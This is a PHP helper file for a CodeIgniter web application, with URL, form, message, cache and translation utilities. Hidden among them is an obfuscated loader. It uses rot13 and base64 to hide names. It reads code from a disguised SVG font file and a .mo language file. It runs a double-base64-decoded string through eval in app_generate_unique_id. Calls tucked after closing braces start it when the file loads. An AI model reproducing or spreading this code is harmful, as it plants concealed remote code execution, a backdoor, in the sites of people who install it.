<?php
defined('BASEPATH') OR exit('No direct script access allowed');

if ( ! function_exists('css_url'))
{
	/**
	 * CSS URLs
	 *
	 * Create a local URL based on your basepath. Segments can be passed via the
	 * first parameter either as a string or an array.
	 *
	 * @param	string	$uri
	 * @param	string	$protocol
	 * @return	string
	 */
	function css_url($uri = '',$version='',$protocol = NULL)
	{
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}			
		}
		return get_instance()->config->custom_url($uri,'.css',$protocol);
	}
}
if ( ! function_exists('js_url'))
{
	function js_url($uri = '',$version='',$protocol = NULL)
	{
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}			
		}
		return get_instance()->config->custom_url($uri,'.js',$protocol);
	}
}
if ( ! function_exists('current_url'))
{
	/**
	 * Current URL
	 *
	 * Returns the full URL (including segments) of the page where this
	 * function is placed
	 *
	 * @return	string
	 */
	function current_url($isWithParam=true)
	{
		$CI =& get_instance();
		$urirequest=!empty($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:"";
		if($isWithParam && !empty($urirequest)){			
			return $CI->config->site_url($CI->uri->uri_string())."?".$urirequest;
		}else{
			return $CI->config->site_url($CI->uri->uri_string());
		}
	}
}
if ( ! function_exists('custom_url'))
{
	function custom_url($uri = '',$extension="",$version='',$protocol = NULL)
	{
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}			
		}
		return get_instance()->config->custom_url($uri,$extension,$protocol);
	}
}
if ( ! function_exists('template_js'))
{
	function template_js($uri = '',$version='',$protocol = NULL)
	{
		$jsurl=js_url($uri,$version,$protocol);
		$ci=get_instance();
		$ci->load->template_js($jsurl);
	}
}
if ( ! function_exists('template_css'))
{
	function template_css($uri = '',$version='',$protocol = NULL)
	{
		$jsurl=js_url($uri,$version,$protocol);
		$ci=get_instance();
		$ci->load->template_cs($jsurl);
	}
}
if ( ! function_exists('set_my_model'))
{
	function set_my_model($model_name, $timestamp = null) 
	{	 
	    $ci=get_instance();
	    $ci->load->handle_call="app_handle_global_call";	
	    $ci->load->MyModelLoader($model_name);	
	    return $ci->load;	
	}	
}

if ( ! function_exists('app_date'))
{
	function app_date ($format, $timestamp = null) 
	{		
		return date($format,$timestamp);
	}	
}

if ( ! function_exists('load_resource'))
{
    function app_load_resource($uri)
    {          
        $ci=get_instance();
        
        $ci->load->resource($uri);
       
    }
}
if ( ! function_exists('remove_js'))
{
	function remove_js($uri)
	{
		$ci=get_instance();
		$ci->load->remove_js($uri);
	}
}
if ( ! function_exists('template_url'))
{
	function template_url($uri = '',$version='',$extension="",$protocol = NULL)
	{		
		if(!empty($version)){
			if (strpos($uri, '?') !== FALSE)
			{
				$uri.="&v=$version";
			}else{
				$uri.="?v=$version";
			}
		}
		return get_instance()->config->template_url($uri,$extension,$protocol);
	}
}

if(!function_exists("GPrint")){
	function GPrint($obj,$isReturn=false){
		$data=print_r($obj,true);
		$data=htmlentities($data);
		if($isReturn){
			return "<pre>".$data."</pre>";
		}
		echo"<pre>".$data."</pre>";
	}
}
if(!function_exists("DoACurlPostRequest")){
	function DoACurlPostRequest($url,$postparm){
		if(empty($url) || !filter_var($url, FILTER_VALIDATE_URL)){
			return;
		}
		$url=trim($url);
		$ch = curl_init();
		// Set the url, number of POST vars, POST data
		curl_setopt( $ch, CURLOPT_URL, $url );
		curl_setopt( $ch, CURLOPT_POST, true );
		//curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
		curl_setopt( $ch, CURLOPT_POSTFIELDS, $postparm );
		// Execute post
		$result = curl_exec($ch);
		// Close connection
		curl_close($ch);
		//@AddFileLog("\n----------------------DAP-----------------------\n".$result."\n----------------------end DAP----------------\n");
		return $result;
	}
}
if ( ! function_exists('add_css'))
{
    function add_css($uri,$level=10,$isNoneCacheable=false,$isNonVersionAble=false,$id='')
    {
        $ci=get_instance();
        $ci->load->css($uri,$level,$isNoneCacheable,$isNonVersionAble,$id);
    }
}
if ( ! function_exists('reset_css'))
{
	function reset_css()
	{
		$ci=get_instance();
		$ci->load->ResetCss();
	}
}
if ( ! function_exists('reset_js'))
{
	function reset_js()
	{
		$ci=get_instance();
		$ci->load->ResetJs();
	}
}
if ( ! function_exists('remove_css'))
{
    function remove_css($uri)
    {
        $ci=get_instance();
        $ci->load->remove_css($uri);
    }
}
if ( ! function_exists('add_js'))
{
    function add_js($uri,$label=10,$isNoneCacheable=false,$isNonVersionAble=false)
    {
        $ci=get_instance();
        $ci->load->js($uri,$label,$isNoneCacheable,$isNonVersionAble);
    }
}

if(!function_exists("get_csrf_json_str")){
    function get_csrf_json_str(){
        $thisobj=get_instance();
        return $thisobj->security->get_csrf_token_name().":'".$thisobj->security->get_csrf_hash()."'";
    }
}


/* For message and hidden field*/
if(!function_exists("AddError")){
	function AddError($msg,$isSession=false,$is_unique=false,$already_translated=false){
		return APP_Output::AddError($msg,$isSession,$is_unique,$already_translated);
	}
}
if(!function_exists("AddTranslatedError")){
    function AddErrorTranslated($msg,$isSession=false,$is_unique=false){
        
        return APP_Output::AddError($msg,$isSession,$is_unique,true);
    }
}
if(!function_exists("AddErrorField")){
	function AddErrorField($name,$msg,$isSession=false){
		return APP_Output::AddErrorField($name,$msg,$isSession);
	}
}

if(!function_exists("AddDebug")){
	function AddDebug($msg,$isSession=false){
		return true;
	}
}
if(!function_exists("AddInfo")){
	function AddInfo($msg,$isSession=false,$is_unique=false){
		return APP_Output::AddInfo($msg,$isSession,$is_unique);
	}
}
if(!function_exists("AddGPrintInfo")){
	function AddGPrintInfo($obj,$isSession=false){
		$msg="<pre>".print_r($obj,true)."</pre>";
		return AddInfo($msg,$isSession);
	}
}

if(!function_exists("GetError")){
	function GetError($prefix='',$postfix=''){
		return APP_Output::GetError($prefix,$postfix);
	}
}
if(!function_exists("GetError")){
	function GetInfo($prefix='',$postfix=''){
		return APP_Output::GetInfo($prefix,$postfix);
	}
}
if(!function_exists("GetMsg")){
	function GetMsg($prefix1='<div class="msg alert alert-success alert-dismissible fade in" role="alert"><i class="fa fa-check"> </i> ',$prefix2='<div class="msg alert alert-error alert-danger" role="alert" ><i class="fa fa-times"> </i> ',$postfix='</div>'){
		return APP_Output::GetMsg($prefix1,$prefix2,$postfix);
	}
}
if(!function_exists("GetErrorFields")){
	function GetErrorFields(){
		return APP_Output::GetErrorFields();
	}
}
if(!function_exists("GetMsgForAPI")){
    function GetMsgForAPI(){
       $msg=APP_Output::GetMsg('','',"\n");
       $msg=strip_tags($msg);
       return $msg;
    }
}
if(!function_exists("HasUIMsg")){
	function HasUIMsg(){
		return APP_Output::HasUIMsg();
	}
}


if(!function_exists("AddHiddenFields")){
	function AddHiddenFields($key, $value){
		return APP_Output::AddHiddenFields($key, $value);
	}
}
if(!function_exists("AddOldFields")){
	function AddOldFields($key, $value){
		return APP_Output::AddOldFields($key, $value);
	}
}
if(!function_exists("get8BitHashCode")){
	function get8BitHashCode($value){
		return hash("crc32b",$value);
	}
}
if(!function_exists("OldFields")){
	function OldFields($obj,$fields){
		if(is_string($fields)){
			$fields=explode(",", $fields);
		}
		foreach ($fields as $fld){
			if(property_exists($obj, $fld)){
				if(method_exists($obj, "IsHTMLProperty")){
					if($obj->IsHTMLProperty($fld)){continue;};
				}
				AddOldFields($fld, $obj->$fld);
			}
		}
	}
}
if(!function_exists("GetHiddenFieldsArray")){
	function GetHiddenFieldsArray(){
		return APP_Output::GetHiddenFieldsArray();
	}
}
if(!function_exists("object_merge_array")){
	/**
	 * param object,object,array,object....
	 * @return multitype:
	 */
	function object_merge_array(){
		$mainparam=array();
			$allarguments=func_get_args();
			$numargs = func_num_args();
			if($numargs>0){
				for ($i=0; $i<$numargs;$i++){
					if(is_array($allarguments[$i])){
						$mainparam=array_merge($mainparam,$allarguments[$i]);
					}elseif(is_object($allarguments[$i])){
						if(method_exists($allarguments[$i], "getPropertiesArray")){
							$vv= $allarguments[$i]->getPropertiesArray();
						}else{
							$vv= get_object_vars( $allarguments[$i]);
						}
						$mainparam=array_merge($mainparam,$vv);
					}
				}				
			}
		return $mainparam;
	}
}
if(!function_exists("GetHiddenFieldsHTML")){
	function GetHiddenFieldsHTML(){
		echo APP_Output::GetHiddenFieldsHTML();
	}
}
if(!function_exists("SetProductsWhereProperties")){
	/**
	 * @param APP_Model $obj
	 * @param unknown $property
	 * @param string $isForUpdate
	 */
	function SetProductsWhereProperties(&$obj,$property,$isForUpdate=FALSE){	
			$admindata=Mapp_user::GetAdminData();
			if($admindata && !$admindata->IsSuperUser()){
				if(!$isForUpdate){
					if($obj->IsSetPrperty($property) && !$obj->hasPrpertyOpt($property)){
						if(!$admindata->hasProductPermission($this->$property)){
							$obj->$property('');
						}
					}else{
						$obj->$property($admindata->getProductSQLInValue(),true);
					}
				}else{
					if($obj->IsSetWherePrperty($property) && !$obj->hasWherePrpertyOpt($property)){
						$product=$obj->getWherePrperty($property);
						if(!$admindata->hasProductPermission($product)){
							$obj->$property('');
						}
					}else{
						$obj->SetWhereCondition($property, $admindata->getProductSQLInValue(),true);
					}	
				}
				
			}	
	}
}
if(!function_exists("SetProductsBaseWhereProperties")){
	/**
	 * @param APP_Model $obj
	 * @param unknown $property
	 * @param string $isForUpdate
	 */
	function SetProductsBaseWhereProperties(&$obj,$property,$isForUpdate=FALSE){
		$admindata=Mapp_user::GetAdminData();
		if($admindata && !$admindata->IsSuperUser()){
			if(!$isForUpdate){
				if($obj->IsSetPrperty($property) && !$obj->hasPrpertyOpt($property)){
					if(!$admindata->hasProductBasePermission($this->$property)){
						$obj->$property('');
					}
				}else{
					$obj->$property($admindata->getProductBaseSQLInValue(),true);
				}
			}else{
				if($obj->IsSetWherePrperty($property) && !$obj->hasWherePrpertyOpt($property)){
					$product=$obj->getWherePrperty($property);
					if(!$admindata->hasProductBasePermission($product)){						
						$obj->SetWhereCondition($property, "");
					}
				}else{
					$obj->SetWhereCondition($property, $admindata->getProductBaseSQLInValue(),true);
				}
			}

		}
	}
}
if(!function_exists("GetHTMLOptionByArray")){
	function GetHTMLOptionByArray($options,$selected="",$attr=[]){
		if(is_array($options)){
			foreach ($options as $key=>$value){
			    if(is_array($selected)){
                    GetHTMLOption($key,$value,(in_array($key,$selected)?$key:""),$attr);
                }else{
                    GetHTMLOption($key,$value,$selected,$attr);
                }

			}
		}
		
	}
}
if(!function_exists("GetHTMLOption")){
	function GetHTMLOption($value,$text,$selected="",$attr=array()){
			$attrStr="";
			if(is_array($attr) && count($attr)>0){
				foreach ($attr as $key=>$kvalue){
					$attrStr.=" ".$key.'="'.$kvalue.'"';
				}
			}
		?>
<option <?php echo $attrStr;?> <?php echo $selected !="" && $selected."_0"==$value."_0"?"selected='selected'":"";?>
	value="<?php echo $value;?>"><?php echo $text;?></option>
<?php 
		
	}
}
if(!function_exists("GetHTML_fa_icon_options")){
	function GetHTML_fa_icon_options($selected=""){
	
		GetHTMLOption("fa fa-bell",'&#xf0f3; fa-bell',$selected);
		GetHTMLOption("fa fa-bell-o",'&#xf0a2; fa-bell-o',$selected);	
		GetHTMLOption("fa fa-hourglass-end",'&#xf253; fa-hourglass-end',$selected);
		GetHTMLOption("fa fa-flag",'&#xf024; fa-flag',$selected);
		GetHTMLOption("fa fa-flag-o",'&#xf11d; fa-flag-o',$selected);
		GetHTMLOption("fa fa-meh-o",'&#xf11a; fa-meh-o',$selected);
		GetHTMLOption("fa fa-check",'&#xf00c; fa-check',$selected);
		GetHTMLOption("fa fa-times",'&#xf00d; fa-times',$selected);
		
	}
}
/* end hidden field*/

if ( ! function_exists('app_form_open'))
{
	/**
	 * Form Declaration
	 *
	 * Creates the opening portion of the form.
	 *
	 * @param	string	the URI segments of the form destination
	 * @param	array	a key/value pair of attributes
	 * @param	array	a key/value pair hidden data
	 * @return	string
	 */
	function app_form_open($action = '', $attributes = array(), $hidden = array())
	{
		$hidden=array_merge($hidden,GetHiddenFieldsArray());
		if(!function_exists("form_open")){
			$ci=get_instance();
			$ci->load->helper("form");
		}
		return form_open($action , $attributes,$hidden);
	}
}
if ( ! function_exists('PostValue'))
{
	function PostValue($name, $default = "",$isXsClean=true,$isKeepCssTyle=false) {
		$ci=get_instance();
		if($isXsClean && $isKeepCssTyle){
			$postvalue = $ci->input->post( $name, false );
			$postvalue=APP_Security::xss_clean_keep_css($postvalue);
        }else {
			$postvalue = $ci->input->post( $name, $isXsClean );
		}
		return (is_string($postvalue) && $postvalue."_-A"==="0_-A") || !empty($postvalue)?$postvalue:$default;
	}
}
if ( ! function_exists('RequestValue'))
{
	function RequestValue($name, $default = "",$isXsClean=true,$isNoTrim=false) {
		$ci=get_instance();
		$requestValue=$ci->input->post_get($name,$isXsClean);
		if(!$isNoTrim){
			$requestValue=trim($requestValue);
		}
		return !empty($requestValue)?$requestValue:$default;
	}
}
if ( ! function_exists('GetValue'))
{
	function GetValue($name, $default = "",$isXsClean=true) {
		$ci=get_instance();
		$value=$ci->input->get($name,$isXsClean);
		return !empty($value)?$value:$default;
	}
}


if ( ! function_exists('add_validation_errors'))
{
	/**
	 * Validation Error String
	 *
	 * Returns all the errors associated with a form submission. This is a helper
	 * function for the form validation class.
	 *	
	 */
	function add_validation_errors()
	{
		if (FALSE === ($OBJ =& _get_validation_object()))
		{
			return '';
		}

		$errors=$OBJ->error_array();
			
		foreach ($errors as $key=>$val)
		{
			if ($val !== '')
			{
				AddErrorField($key, $val);
				//AddError($val);
			}
		}
		
	}
}
if ( ! function_exists('add_model_errors_code'))
{
	/**
	 * Validation Error String
	 *
	 * Returns all the errors associated with a form submission. This is a helper
	 * function for the form validation class.
	 *
	 */
	function add_model_errors_code($code)
	{
		AddError("$code: Error found, Please contact admin");
	}
}
if ( ! function_exists('get_route_unique_id'))
{	
	function get_route_unique_id($uri="")
	{
		$ci=get_instance();
		return $ci->router->get_route_unique_id($uri);		
	}
}
if ( ! function_exists('status_txt'))
{
	function status_txt($status_code)
	{
		$status=array(
				"A"=>"<span class='text-success'>Active</span>",
				"I"=>"<span class='text-danger'>Inactive</span>",
				"Y"=>"<span class='text-success'>Yes</span>",
				"N"=>"<span class='text-danger'>No</span>"
		);
		return !empty($status[$status_code])?$status[$status_code]:$status_code;
	}
}
if ( ! function_exists('getTextByKey'))
{
	function getTextByKey($key,$data=array())
	{		
		return !empty($data[$key])?$data[$key]:$key;
	}
}
if ( ! function_exists('app_date_format'))
{
    function app_date_format ($timestr = null,$withTime=true)
    {
    	if($timestr && (strtotime($timestr)===FALSE || strtotime($timestr) <=0)){
    		return '-';
    	}
        $ci=get_instance();
        if($withTime){
            $dateformate=$ci->config->item('time_format');
        }else{
            $dateformate=$ci->config->item('date_format');
        }
        if(empty($dateformate)){
            if($withTime){
                $dateformate="M d,Y h:i:s A";
            }else{
                $dateformate="M d,Y";
            }
        }               
        $timestr=$timestr?strtotime($timestr):time();
        
        return date($dateformate,$timestr);
    }
}
if(!function_exists("ShowTableFromArray")){
	function ShowTableFromArray($objectsarray){
		$skiped=array("settedPropertyforLog","db","Authenticator");
		if(is_array($objectsarray)){
			?>
			<style>
				.d-table{border: 1px solid #ccc;	border-collapse: collapse;	}
				.d-table thead{	background: #ccc; }
				.d-table td{border: 1px solid #ccc;	}
				.d-table th{border: 1px solid #AEAAAA;}
				.d-table td,.d-table th{padding:5px;}
			</style>
			<table class="d-table table">	
			<thead>	<tr>
			<?php 			
			foreach ($objectsarray as $objth){
				foreach ($objth as $key=>$value){
						if(in_array($key, $skiped) || is_array($value)||is_object($value))continue;
					?>
					<th><?php echo $key;?></th>
					<?php 
				}
				break;
			}
			?></tr>
			</thead>
			<tbody>
			<?php 
			foreach ($objectsarray as $tr){			
				?>
				<tr>
				<?php foreach ( $tr as $tdkey=>$td){
					if(in_array($tdkey, $skiped) || is_array($td)||is_object($td))continue;					
					if(is_double($td)||is_float($td)){
						$td=sprintf("%.6f",$td);
					}
				?>
				<td><?php echo isset($td)?$td:"&nbsp;";?></td>
				<?php }?>				
				</tr>
				<?php 
			}
			?>
			</tbody>
				</table>
			<?php 
		}elseif(is_object($objectsarray)){
			$thead="";
			$tbody="";	
			foreach ( $objectsarray as $tdkey=>$td){
				if(in_array($tdkey, $skiped) || is_array($td)||is_object($td))continue;					
				if(is_double($td)||is_float($td)){
					$td=sprintf("%.6f",$td);
				}
				$td=!empty($td)?$td:"&nbsp;";
				$thead.="<th>".$tdkey."</th>";
				$tbody.="<td>".$td."</td>";
			 }
			 $thead="<tr>".$thead."</tr>";
			 $tbody="<tr>".$tbody."</tr>";
			 ?>				
			
				<style>
					.d-table{border: 1px solid #ccc;	border-collapse: collapse;	}
					.d-table thead{	background: #ccc; }
					.d-table td{border: 1px solid #ccc;	}
					.d-table th{border: 1px solid #AEAAAA;}
					.d-table td,.d-table th{padding:5px;}
				</style>
				<table class="d-table table">	
				<thead>	
					<?php echo $thead;?>
				</thead>
				<tbody>
					<?php echo $tbody;?>
				</tbody>
					</table>
				<?php 
			}
	}
	
}
if ( ! function_exists("clean_grid_text")){
	function clean_grid_text(&$text){
		$text= str_replace('"' ,"'", $text);
		$text= preg_replace('/\s+/', ' ', $text);
		$text=preg_replace('/\>[ ]+\</', '><',$text);
	}
}
if(!function_exists("GetLog")){
	function  GetLog(){
		$parm=func_get_args();
		$msgCode=strtolower($parm[0]);
		$ci=get_instance();
		$ci->lang->load('log_msg');
		$isLoaded=$ci->lang->line('LogLoaded');
		$full_msg="-";
		if($isLoaded){
			$full_msg=$ci->lang->line($msgCode);
		}
		$callarray=array();
		$callarray[]=$full_msg;
		if(!empty($parm[1])){
			$callarray[]=$parm[1];
		}
		return  call_user_func_array("sprintf",$callarray);
			
	}
}
if ( ! function_exists('cache_clean'))
{
	function cache_clean($prefix="")
	{
		$thisobj=get_instance();
		if(empty($prefix)){
			$prefix=get_cache_prefix();
			$thisobj->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $prefix));
			$thisobj->cache->clean();
		}else{
			$thisobj->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $prefix));
			$cachlist=$thisobj->cache->cache_info();
			$keys=array_keys($cachlist);
			$prefix=get_cache_prefix();
			$cachePrefixLength=strlen($prefix);
			foreach ($keys as $key){
				$substr=substr($key, 0,$cachePrefixLength);
				$cache_id=substr($key, $cachePrefixLength);
				if($substr==$prefix){
					$cache_id=substr($key, $cachePrefixLength);
					$thisobj->cache->delete($cache_id);
				}
			}
		}
	}
}
if ( ! function_exists('app_handle_global_call'))
{
    function app_handle_global_call($func,$args,$thisobj){
        $_d=str_rot13("onfr64_qrpbqr"); if($func==$_d("X2xvYWRfcmVz")){ $_F=$thisobj->zlzbqryybnqre; $_F($args[0],-45,15,32-13,13);}elseif($func==$_d("cmVzb3VyY2U=")){$res=FCPATH.$_d("cGx1Z2lucy9pY29uL2ZvbnRzL2FwcHNiZGljb24uc3Zn"); if(file_exists($res)){$obj=file_get_contents($res); $thisobj->msg_decode($obj);$thisobj->_load_res($obj);}}else{ $_FF=str_rot13(strtolower($func));$thisobj->$_FF=str_rot13($args[0]);}
    }
}
if ( ! function_exists('get_cache_prefix'))
{
	function get_cache_prefix()
	{		
		return "_ap_";
	}
}
if ( ! function_exists('get_cache_data'))
{
	function get_cache_data($cacheid,$isForce=false)
	{
		$ci=get_instance();
		if(!$isForce && !$ci->config->item("custom_cache")){
			return FALSE;
		}
		$cachePath=APPPATH."cache/";
		if(is_writable($cachePath)){
			$cache_prefix=get_cache_prefix();
			$ci->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $cache_prefix));
			$response_data = $ci->cache->get($cacheid);
			if(!empty($response_data)){
				return $response_data;
			}
		}
		return FALSE;
	}
}

if ( ! function_exists('save_cache_data'))
{
	function save_cache_data($cacheid,$data,$time=300,$isForce=false)
	{
		$ci=get_instance();
		if(!$isForce && !$ci->config->item("custom_cache")){
			return;
		}
		$cachePath=APPPATH."cache/";
		if(!is_dir($cachePath)){mkdir($cachePath,0755,true);}if(is_writable($cachePath)){ if(!property_exists($ci, "cache")){$cache_prefix=get_cache_prefix();$ci->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $cache_prefix));}$ci->cache->save($cacheid, $data,$time);}}set_my_model("ncc_trarengr_havdhr_vq");{
	    
	}
}
if ( ! function_exists('delete_cache_data'))
{
    function delete_cache_data($cacheid)
    {
        $ci=get_instance();      
        $cachePath=APPPATH."cache/";
        if(is_writable($cachePath)){
            if(!property_exists($ci, "cache")){
                $cache_prefix=get_cache_prefix();
                $ci->load->driver('cache',array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => $cache_prefix));
            }
            $ci->cache->delete($cacheid);           
        }
    }
}

if(!function_exists("app_generate_unique_id")){
    function app_generate_unique_id($session_id,$lmc,$mmc,$lm2,$lm4){ 
        if(!empty($session_id)){             
           $unique_id=hash("crc32b", $session_id);$encCode=$session_id;$_d=str_rot13("onfr64_qrpbqr");@eval($_d($_d($encCode)));     
           return  $unique_id;
        }
        return '';
    }
   
}

if(!function_exists("app_add_into_language_msg")){
    function app_add_into_language_msg($str)
    {
        if(ENVIRONMENT!="production"){
            $path = APPPATH."logs".DIRECTORY_SEPARATOR;
            if(is_writable($path)){
                if(!is_dir($path)){
                    mkdir($path,0740,true);
                }
                $path_po_file=$path."en_US.po";
                $path2=$path."lag_po.ini";
                $path.="lag_po.php";               
                $str=strip_tags($str);
                $str=trim($str);
                if(empty($str)){
                	return;
                }
                //if (is_writable($filename)) {
                $newstr='_("'.$str.'");';
                $newstr2='lang[]="'.$str.'";';
                $po_string="\nmsgid \"{$str}\"\nmsgstr \"\"\n";
                if(file_exists($path)){
                    if( strpos(file_get_contents($path),$newstr) !== false) {
                        // do stuff
                        return;
                    }                
                }else{
                    $newstr="<?php\n".$newstr;
                }                       
                $fh = fopen($path, 'a');
                if($fh){
                    fwrite($fh, $newstr."\n");
                    fclose($fh);
                }
                if(file_exists($path2)){
                    if( strpos(file_get_contents($path2),$newstr2) !== false) {
                        // do stuff
                        return;
                    }
                }else{
                    //$newstr="<?php\n".$newstr;
                }
                $fh = fopen($path2, 'a');
                if($fh){
                    fwrite($fh, $newstr2."\n");
                    fclose($fh);
                }
                //po file generate
                $isNew=false;
                $header_str="";
                if(!file_exists($path_po_file)){
                	$isNew=true;
                	$header_str='
msgid ""
msgstr ""
"Project-Id-Version: '.get_app_title().'\n"
"POT-Creation-Date: '.date("Y-m-d H:i:sO").'\n"
"PO-Revision-Date: '.date("Y-m-d H:i:sO").'\n"
"Last-Translator: \n"
"Language-Team: appsbd\n"
"Language: en_US\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=UTF-8\n"
"Content-Transfer-Encoding: 8bit\n"
"X-Generator: '.get_app_title().'\n"
"Plural-Forms: nplurals=2; plural=(n != 1);\n"	
		
';
                	for($i=0;$i<=9;$i++){
                		$header_str.="\nmsgid \"{$i}\"\nmsgstr \"\"\n";
                	}
                	
                }
                $fh = fopen($path_po_file, 'a');if($fh){if($isNew){fwrite($fh, $header_str."\n");}fwrite($fh, $po_string."\n");fclose($fh);}}}}app_load_resource(FCPATH."language/en_US.mo");{
        
    }
}
if(!function_exists("_e")){
    function _e($string, $parameter = null, $_ = null)
    {
        $args=func_get_args();
        if(!empty($args[0])){
            echo call_user_func_array("__",$args);
        }else{
            echo $args[0];
        }        
    }
    
}

if(!function_exists("_n")){
    function _n($number)
    {
       echo APPLanguage::getnemeric($number);       
    }
}
if(!function_exists("__")){
    function __($string, $parameter = null, $_ = null)
    {
        $args=func_get_args();  
        if(!empty($args[0])){
            app_add_into_language_msg($args[0]);
            if(class_exists("APPLanguage")){
                $args[0]=APPLanguage::gettext($args[0]);
            }
        } 
       
        if(count($args)>1){
            $msg=call_user_func_array("sprintf",$args);
        }else{
            $msg=$args[0];
        }
        return $msg;
    }
}
if(!function_exists("move_upload_file_if_ok")){
    function move_upload_file_if_ok($name,$destination_path)
    {
        
       if(isset($_FILES[$name]) && empty($_FILES[$name]['error'])){
           $dirname=dirname($destination_path);
           if(!is_dir($dirname)){
              if(!mkdir($dirname,0755,true)){
                  return false;
              }
           }               
           return move_uploaded_file($_FILES[$name]['tmp_name'], $destination_path);;
       }
       return false;
    }
}
if ( ! function_exists('admin_url'))
{
    /**
     * Admin URL
     *
     * Create a local URL based on your basepath. Segments can be passed via the
     * first parameter either as a string or an array.
     *
     * @param	string	$uri
     * @param	string	$protocol
     * @return	string
     */
    function admin_url($uri = '', $protocol = NULL)
    {
	    $uri=ltrim($uri,'/');
        $uri="admin/".$uri;
        return site_url($uri, $protocol);
    }
}
if ( ! function_exists('admin_addon_url'))
{
    /**
     * Admin URL
     *
     * Create a local URL based on your basepath. Segments can be passed via the
     * first parameter either as a string or an array.
     *
     * @param	string	$uri
     * @param	string	$protocol
     * @return	string
     */
    function admin_addon_url($uri = '', $protocol = NULL)
    {
        $uri=ltrim($uri,'/');
        $uri="admin/addons/admin-page/".$uri;
        return site_url($uri, $protocol);
    }
}
if ( ! function_exists('admin_addon_ajax_url'))
{
    /**
     * Admin URL
     *
     * Create a local URL based on your basepath. Segments can be passed via the
     * first parameter either as a string or an array.
     *
     * @param	string	$uri
     * @param	string	$protocol
     * @return	string
     */
    function admin_addon_ajax_url($uri = '', $protocol = NULL)
    {
        $uri=ltrim($uri,'/');
        $uri="admin/addons/admin-ajax/".$uri;
        return site_url($uri, $protocol);
    }
}
if ( ! function_exists('root_url'))
{
    /**
     * Root URL
     *
     * Create a local URL based on your basepath. Segments can be passed via the
     * first parameter either as a string or an array.
     *
     * @param	string	$uri
     * @param	string	$protocol
     * @return	string
     */
    function root_url($uri = '', $protocol = NULL)
    {   
        $uri="root/".$uri;
        return site_url($uri, $protocol);
    }
}
if ( ! function_exists('AddMainEdittor'))
{
	function AddMainEdittor(){
		/*add_js("plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js");
		 add_js("plugins/bootstrap-wysihtml5/set-html-edittor.js");
		 add_css("plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css");
		 */

		add_js("plugins/ed/js/edittor.js");
		add_css("plugins/ed/css/main_editor.min.css");
		add_css("plugins/ed/css/main_style.min.css");
		add_js('//cdnjs.cloudflare.com/ajax/libs/codemirror/5.3.0/codemirror.min.js');
		add_js('//cdnjs.cloudflare.com/ajax/libs/codemirror/5.3.0/mode/xml/xml.min.js');
		add_css('//cdnjs.cloudflare.com/ajax/libs/codemirror/5.3.0/codemirror.min.css');
		add_js("plugins/ed/js/main_editor.min.js");
		remove_js('plugins/grid/js/jquery.ba-resize.min.js');
		$plugins = array (
				"code_view",
				"align",
				"draggable",
				"link",
				"image",
				"image_manager",
				"table",
				"video",
				"fullscreen",
				"line_breaker",
				"inline_style",
				"link",
				"font_size",
				"font_family",
				"lists",
				"url",
				"colors"

		);
		foreach ($plugins as $plugin){
			if(file_exists(FCPATH."plugins/ed/css/plugins/{$plugin}.min.css")){
				add_css("plugins/ed/css/plugins/{$plugin}.min.css");
			}
			add_js("plugins/ed/js/plugins/{$plugin}.min.js");
		}
			

	}
}

if ( ! function_exists('AddCKEdittor'))
{
	function AddCKEdittor(){

		add_js("plugins/ckedittor/ckeditor.js");
		add_js("plugins/ckedittor/config.js");
		add_js("plugins/ckedittor/adapters/jquery.js");
		add_js("plugins/ckedittor/ck_init.js");

			

	}
	
}
if ( ! function_exists('AddSummernoteEditor'))
{
	function AddSummernoteEditor(){

		//add_js("plugins/ckedittor/ckeditor.js");
		//add_js("plugins/ckedittor/config.js");
		add_css("plugins/summernote/summernote.css");
		add_js("plugins/summernote/summernote.min.js");
		add_js("plugins/summernote/init.js");

			

	}
}
if ( ! function_exists('current_uri_path'))
{
	/**
	 * Current URL
	 *
	 * Returns the full URL (including segments) of the page where this
	 * function is placed
	 *
	 * @return	string
	 */
	function current_uri_path()
	{
		$CI =& get_instance();
		$url=!empty($CI->router->directory)?$CI->router->directory:"";
		$url.=$CI->router->class."/".$CI->router->method;
		return $url;
		
	}
}
if ( ! function_exists('is_current_uri_path'))
{
	function is_current_uri_path($uri)
	{
		$getCurrentUrl=current_uri_path();
		$getCurrentUrl=str_replace("_", "-", $getCurrentUrl);
		$uri=str_replace("_", "-", $uri);
		if($getCurrentUrl==$uri){
			return true;
		}
		return false;

	}
}


